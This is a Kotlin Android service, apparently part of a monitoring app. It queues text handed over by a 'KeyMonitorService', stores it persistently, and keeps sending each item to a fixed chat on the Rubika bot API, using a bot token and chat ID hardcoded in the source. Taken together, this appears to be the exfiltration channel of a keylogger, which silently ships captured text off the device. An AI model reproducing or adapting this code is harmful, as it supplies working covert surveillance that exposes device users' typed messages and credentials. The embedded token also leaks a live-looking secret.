package com.example

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue

class RubikaBotService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var isRunning = false

    companion object {
        private val messageQueue = ConcurrentLinkedQueue<String>()
        private lateinit var prefs: SharedPreferences

        // تابع برای اضافه کردن پیام از بیرون (از KeyMonitorService صدا زده می‌شود)
        fun addMessageToQueue(context: Context, text: String) {
            messageQueue.add(text)
            savePendingMessages(context)
            Log.d("RubikaBot", "پیام به صف اضافه شد: $text")
        }

        private fun savePendingMessages(context: Context) {
            val set = mutableSetOf<String>()
            set.addAll(messageQueue)
            prefs = context.getSharedPreferences("rubika_bot", Context.MODE_PRIVATE)
            prefs.edit().putStringSet("pending_messages", set).apply()
        }

        private fun loadPendingMessages(context: Context) {
            prefs = context.getSharedPreferences("rubika_bot", Context.MODE_PRIVATE)
            val saved = prefs.getStringSet("pending_messages", mutableSetOf())
            saved?.forEach { messageQueue.add(it) }
            Log.d("RubikaBot", "${messageQueue.size} پیام منتظر از حافظه بازیابی شد")
        }
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        loadPendingMessages(this)
        startForeground()
        startSendingMessages()
    }

    private fun startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "rubika_channel",
                "ارسال به روبیکا",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, "rubika_channel")
            .setContentTitle("ربات روبیکا")
            .setContentText("${messageQueue.size} پیام در صف")
            .setSmallIcon(android.R.drawable.ic_menu_send)
            .build()
        startForeground(1, notification)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startSendingMessages() {
        serviceScope.launch {
            while (isRunning) {
                if (isInternetAvailable() && messageQueue.isNotEmpty()) {
                    val text = messageQueue.poll()
                    val success = sendMessageToRubika(text)
                    if (success) {
                        Log.d("RubikaBot", "✅ ارسال شد: $text")
                        savePendingMessages(this@RubikaBotService)
                        updateNotification()
                    } else {
                        // در صورت خطا، دوباره به صف برگردان
                        messageQueue.add(text)
                        Log.d("RubikaBot", "❌ ارسال نشد، به صف برگشت: $text")
                        delay(5000) // صبر کن و دوباره تلاش کن
                    }
                }
                delay(2000) // هر ۲ ثانیه یک بار چک کن
            }
        }
    }

    private fun sendMessageToRubika(text: String): Boolean {
        return try {
            val client = OkHttpClient()
            val json = JSONObject().apply {
                put("chat_id", "b0IqcgX0urG09acd971fbdaafc583560")
                put("text", text)
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val token = "CAHIDD0BCWISCKPMEHDXXWOYTLEQGBWCXFGHODDHFNAXQKZIZUMEMWZKDQLYQYYE"
            val request = Request.Builder()
                .url("https://botapi.rubika.ir/v3/$token/sendMessage")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("RubikaBot", "خطا: ${e.message}")
            false
        }
    }

    private fun isInternetAvailable(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec("ping -c 1 8.8.8.8")
            process.waitFor() == 0
        } catch (e: Exception) {
            false
        }
    }

    private fun updateNotification() {
        val notification = NotificationCompat.Builder(this, "rubika_channel")
            .setContentTitle("ربات روبیکا")
            .setContentText("${messageQueue.size} پیام در صف")
            .setSmallIcon(android.R.drawable.ic_menu_send)
            .build()
        startForeground(1, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        savePendingMessages(this)
        serviceScope.cancel()
        Log.d("RubikaBot", "سرویس متوقف شد - ${messageQueue.size} پیام باقی ماند")
    }
}